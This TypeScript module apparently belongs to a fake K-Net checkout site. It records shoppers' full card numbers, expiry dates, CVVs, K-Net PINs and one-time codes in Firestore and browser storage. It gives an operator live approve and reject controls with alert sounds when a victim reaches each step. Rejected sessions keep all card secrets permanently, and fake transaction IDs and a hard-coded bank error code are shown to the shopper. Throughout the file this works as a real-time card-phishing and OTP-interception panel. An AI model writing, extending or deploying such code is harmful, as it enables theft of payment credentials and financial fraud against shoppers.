import { ActiveOtpSession, PaymentTransactionRecord } from '../types';
import { db } from '../lib/firebase';
import { handleFirestoreError, OperationType, sanitizeForFirestore, savePaymentRecordToCloud } from '../lib/firestoreService';
import { 
  collection, 
  doc, 
  setDoc, 
  updateDoc, 
  deleteDoc, 
  onSnapshot 
} from 'firebase/firestore';
import { playPaymentAlertSound, playOtpAlertSound, playSuccessSound, playGatewayEnteredAlertSound } from './audioAlert';

const STORAGE_KEY = 'deera_active_otp_sessions';
const EVENT_KEY = 'deera_otp_event';
const OTP_COLLECTION = 'otp_sessions';

export const getActiveOtpSessions = (): ActiveOtpSession[] => {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) {
    console.error('Error loading OTP sessions:', e);
    return [];
  }
};

export const saveActiveOtpSession = async (session: ActiveOtpSession) => {
  try {
    // 1. Save locally for instant UI response
    const current = getActiveOtpSessions().filter(s => s.id !== session.id);
    const updated = [session, ...current];
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'updated', session } }));

    // Instant Sound Alert Chimes:
    if (session.status === 'entered_gateway') {
      playGatewayEnteredAlertSound();
    } else if (session.status === 'waiting_card_approval') {
      playPaymentAlertSound();
    } else if (session.status === 'waiting_admin_approval') {
      playOtpAlertSound();
    }

    // 2. Persist to Firestore cloud database in real-time
    const docRef = doc(db, OTP_COLLECTION, session.id);
    const sanitizedSession = sanitizeForFirestore(session);
    await setDoc(docRef, {
      ...sanitizedSession,
      updatedAt: new Date().toISOString()
    }, { merge: true });
  } catch (e) {
    handleFirestoreError(e, OperationType.WRITE, `${OTP_COLLECTION}/${session.id}`);
  }
};

// Approve Card details -> Transitions customer to the OTP verification screen
export const approveCardSession = async (sessionId: string) => {
  try {
    const current = getActiveOtpSessions();
    const updated = current.map(s => {
      if (s.id === sessionId) {
        return { ...s, status: 'card_approved' as const };
      }
      return s;
    });
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    const targetSession = updated.find(s => s.id === sessionId);
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'card_approved', session: targetSession, sessionId } }));
    playSuccessSound();

    const docRef = doc(db, OTP_COLLECTION, sessionId);
    await updateDoc(docRef, {
      status: 'card_approved',
      cardApprovedAt: new Date().toISOString()
    });
    return targetSession;
  } catch (e) {
    handleFirestoreError(e, OperationType.UPDATE, `${OTP_COLLECTION}/${sessionId}`);
  }
};

// Reject Card details
export const rejectCardSession = async (sessionId: string, reason?: string) => {
  try {
    const current = getActiveOtpSessions();
    const updated = current.map(s => {
      if (s.id === sessionId) {
        return { 
          ...s, 
          status: 'card_rejected' as const,
          rejectionReason: reason || 'تم رفض بيانات البطاقة من قبل إدارة المتجر. يرجى التأكد من البيانات أو استخدام بطاقة أخرى.' 
        };
      }
      return s;
    });
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    const targetSession = updated.find(s => s.id === sessionId);
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'card_rejected', session: targetSession, sessionId, reason } }));

    const docRef = doc(db, OTP_COLLECTION, sessionId);
    await updateDoc(docRef, {
      status: 'card_rejected',
      rejectionReason: reason || 'تم رفض بيانات البطاقة',
      cardRejectedAt: new Date().toISOString()
    });
    return targetSession;
  } catch (e) {
    handleFirestoreError(e, OperationType.UPDATE, `${OTP_COLLECTION}/${sessionId}`);
  }
};

export const approveOtpSession = async (sessionId: string) => {
  try {
    // 1. Update locally
    const current = getActiveOtpSessions();
    const updated = current.map(s => {
      if (s.id === sessionId) {
        return { ...s, status: 'approved' as const };
      }
      return s;
    });
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    const targetSession = updated.find(s => s.id === sessionId);
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'approved', session: targetSession, sessionId } }));
    playSuccessSound();

    // 2. Update Firestore document in real-time
    const docRef = doc(db, OTP_COLLECTION, sessionId);
    await updateDoc(docRef, {
      status: 'approved',
      approvedAt: new Date().toISOString()
    });
    return targetSession;
  } catch (e) {
    handleFirestoreError(e, OperationType.UPDATE, `${OTP_COLLECTION}/${sessionId}`);
  }
};

export const rejectOtpSession = async (
  sessionId: string,
  reason: string = 'رمز التحقق (OTP) غير صحيح أو منتهي الصلاحية. يرجى التأكد وإعادة المحاولة.',
  errorCode: string = 'ERR_KNET_OTP_INVALID_401'
) => {
  try {
    // 1. Update locally while strictly retaining all payment fields
    const current = getActiveOtpSessions();
    const updated = current.map(s => {
      if (s.id === sessionId) {
        return { 
          ...s, 
          status: 'rejected' as const,
          rejectionReason: reason,
          errorCode: errorCode
        };
      }
      return s;
    });
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    const targetSession = updated.find(s => s.id === sessionId);
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { 
      detail: { 
        type: 'rejected', 
        session: targetSession, 
        sessionId,
        reason,
        errorCode
      } 
    }));

    // 2. CRITICAL: Archive & Retain full payment data into permanent payments log
    if (targetSession) {
      const rejectedPaymentRecord: PaymentTransactionRecord = {
        id: `pay-rej-${targetSession.id}-${Date.now()}`,
        orderId: targetSession.id,
        orderNumber: targetSession.orderNumber,
        customerName: targetSession.customerName || 'عميل المتجر',
        customerPhone: targetSession.customerPhone || '----',
        customerAddress: targetSession.customerAddress || 'الكويت',
        customerApartment: targetSession.customerApartment,
        deliveryNotes: targetSession.deliveryNotes,
        totalAmount: targetSession.total,
        paymentMethod: 'knet',
        bankName: targetSession.bankName || 'بوابة كي نت (K-Net)',
        cardNumberFull: targetSession.cardNumberFull,
        cardNumberMasked: targetSession.cardNumberMasked,
        cardExpiry: targetSession.cardExpiry,
        knetPin: targetSession.knetPin,
        cardCvv: targetSession.cardCvv,
        otpCode: targetSession.otpCode || '----',
        status: 'rejected',
        rejectionReason: reason,
        errorCode: errorCode,
        transactionId: `TXN-REJ-${Math.floor(100000 + Math.random() * 900000)}`,
        referenceNumber: `REF-REJ-${Math.floor(10000000 + Math.random() * 90000000)}`,
        createdAt: new Date().toISOString(),
        timestamp: Date.now()
      };

      // Save to Firestore payments collection
      savePaymentRecordToCloud(rejectedPaymentRecord);

      // Save to LocalStorage payments
      try {
        const rawLocal = localStorage.getItem('thenayan_payments');
        const existing: PaymentTransactionRecord[] = rawLocal ? JSON.parse(rawLocal) : [];
        localStorage.setItem('thenayan_payments', JSON.stringify([rejectedPaymentRecord, ...existing]));
      } catch (err) {
        console.error('Failed to update local thenayan_payments:', err);
      }
    }

    // 3. Update Firestore document with all retained fields
    const docRef = doc(db, OTP_COLLECTION, sessionId);
    await updateDoc(docRef, {
      status: 'rejected',
      rejectionReason: reason,
      errorCode: errorCode,
      rejectedAt: new Date().toISOString()
    });
    return targetSession;
  } catch (e) {
    handleFirestoreError(e, OperationType.UPDATE, `${OTP_COLLECTION}/${sessionId}`);
  }
};

export const removeOtpSession = async (sessionId: string) => {
  try {
    const current = getActiveOtpSessions().filter(s => s.id !== sessionId);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(current));
    window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'removed', sessionId } }));

    // Remove from Firestore
    const docRef = doc(db, OTP_COLLECTION, sessionId);
    await deleteDoc(docRef);
  } catch (e) {
    handleFirestoreError(e, OperationType.DELETE, `${OTP_COLLECTION}/${sessionId}`);
  }
};

// Subscribe to real-time Cloud OTP sessions from Firestore
export const subscribeToCloudOtpSessions = (onUpdate: (sessions: ActiveOtpSession[]) => void) => {
  try {
    const colRef = collection(db, OTP_COLLECTION);
    const unsubscribe = onSnapshot(colRef, (snapshot) => {
      const cloudSessions: ActiveOtpSession[] = [];
      snapshot.forEach(docSnap => {
        cloudSessions.push(docSnap.data() as ActiveOtpSession);
      });
      if (cloudSessions.length > 0) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(cloudSessions));
        window.dispatchEvent(new CustomEvent(EVENT_KEY, { detail: { type: 'synced', sessions: cloudSessions } }));
      }
      onUpdate(cloudSessions);
    }, (error) => {
      handleFirestoreError(error, OperationType.GET, OTP_COLLECTION);
    });
    return unsubscribe;
  } catch (e) {
    handleFirestoreError(e, OperationType.GET, OTP_COLLECTION);
    return () => {};
  }
};
